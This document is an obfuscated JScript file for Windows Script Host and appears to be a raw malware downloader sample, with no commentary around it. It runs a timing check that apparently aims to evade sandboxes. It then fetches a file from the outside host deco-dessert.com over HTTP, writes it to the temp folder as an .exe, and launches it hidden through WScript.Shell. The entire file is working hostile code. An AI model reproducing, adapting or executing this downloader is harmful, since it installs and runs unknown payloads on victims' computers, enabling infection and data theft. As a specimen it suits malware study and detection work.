var v = false;
var P0 = "CreateObject";
var He = function k() {return WScript[P0]("WScript.Shell");}(), cl = 11;
var XN = "MSXML2.XMLHTTP";
var S = 2123213;
var P = 0;
function H(Pz){He["Run"](Pz, P, P);};
function l(){return "" + XN;};
function W(j, ST){P = P * 1; return j - ST;};
function Y(){return P0;};
/*@cc_on
  @if (@_win32 || @_win64)
    v = true;
  @end
@*/
if (v)
{
var H0 = "";
function hI(){return 22;};
var q1 = 0; var Xr = 0;
function wP()
{
var e = new this["Date"]();
var gN = e["getUTCMilliseconds"]();
WScript["Sleep"](hI());
var e = new this["Date"]();
var cq = e["getUTCMilliseconds"]();
WScript["Sleep"](hI());
var e = new this["Date"]();
var O = e["getUTCMilliseconds"]();
var q1 = "u";
q1 = W(cq, gN);
var Xr = "Sc";
Xr = W(O, cq);
H0 = "open";
return W(q1, Xr);
}
var k0 = false;
var D = false;
for (var d = P; d < hI() * 1; d++){if (wP() != P){
k0 = true; 
Xr = "31" + 11 * q1 + Xr; 
D = true; 
break;
}}
function L() {return ((k0 == true) && (k0 == D)) ? 1 : P;};
if (k0 && L() && D){
function Ci() {return He["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "HFKJS74Z3rKP.exe";};
 Ce = l();
 S0 = WScript[P0](Ce);
 var q = 1;
 while (q){
try {
S0[H0]("GET", "http://www.deco-dessert.com/k3dua", false);
S0["send"]();
q0 = "Sleep";
for (;;){WScript[q0](hI() * 11); if (S0["readystate"] >= 2 * 2) break;};
q = P;
} catch(xI){};
}
function Fw(PR) {var B = (1, 2, 3, 4, 5, PR); return B;};
S1 = WScript[Y()]("ADODB.Stream");
Ce = S1;
Ce[H0]();
Ce["type"] = Fw(1);
Ce["write"](S0["ResponseBody"]);
S1["position"] = Fw(P);
Ce["Save" + "ToFile"](Ci(), 2);
S1["c"+"lose"]();
H1 = Ci();
H(H1);
}
}

